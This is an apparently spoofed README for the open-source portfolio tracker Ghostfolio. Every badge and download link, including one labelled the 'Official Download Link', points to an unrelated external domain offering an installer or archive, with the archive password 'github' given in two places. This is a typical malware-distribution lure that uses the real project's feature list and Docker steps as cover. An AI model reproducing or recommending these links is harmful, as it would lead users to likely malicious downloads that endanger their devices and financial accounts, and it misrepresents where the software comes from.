<h1 align="center">Ghostfolio — Open Source Wealth Management & Portfolio Tracker</h1>

<p align="center">
  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
</p>

<p align="center">
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
  <a href="#-key-features">Key Features</a> •
  <a href="#-system-requirements">Requirements</a> •
  <a href="#-installation--deployment">Installation</a> •
  <a href="#-frequently-asked-questions">FAQ</a>
</p>

---

## 📖 About Ghostfolio

**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.

Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.

---

## 📥 Direct Downloads & Links

Get the latest build or source files directly using the links below:

| Download Option | Format | Quick Link |
| :--- | :--- | :--- |
| **Complete Application Package** | Executable / Archive | 👉 **[Download Installer](https://yeelen.cg/gh/)** |
| **Source Code (Latest)** | `.ZIP` Archive | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
| **Source Code (Tarball)** | `.TAR.GZ` Archive | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |

> 🔑 **Archive Password:** `github`

---

## ✨ Key Features & Capabilities

### 📈 Multi-Asset Investment Tracking
* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.

### 📊 Advanced Portfolio Analytics & Insights
* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.

### 🛡️ Privacy, Security & Data Autonomy
* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.

### ⚡ Seamless Data Management
* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.

---

## 🖥️ System Requirements

Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:

* **Operating System:** Windows 10/11, macOS 11+, Linux (Ubuntu, Debian, CentOS), or Docker Host
* **Node.js:** v18.x or v20.x LTS (for manual builds)
* **Database:** PostgreSQL 14+ and Redis 6+ (for server deployments)
* **Hardware:** Minimum 1 GB RAM, 2 GHz CPU, 500 MB free disk space

---

## 🚀 Installation & Deployment

### Method 1: Direct Download (Recommended for End-Users)
1. Download the latest setup file from the **[Official Download Link](https://yeelen.cg/gh/)**.
2. Extract the archive using password: `github`
3. Launch the application and follow the setup instructions.

### Method 2: Docker Compose (Recommended for Self-Hosting)
Deploy Ghostfolio locally or on your NAS/VPS using Docker Compose:

```bash
# 1. Clone the repository
git clone [https://github.com/ghostfolio/ghostfolio.git](https://github.com/ghostfolio/ghostfolio.git)

# 2. Navigate to project root
cd ghostfolio

# 3. Create environment configuration
cp .env.example .env

# 4. Launch containers
docker compose up -d
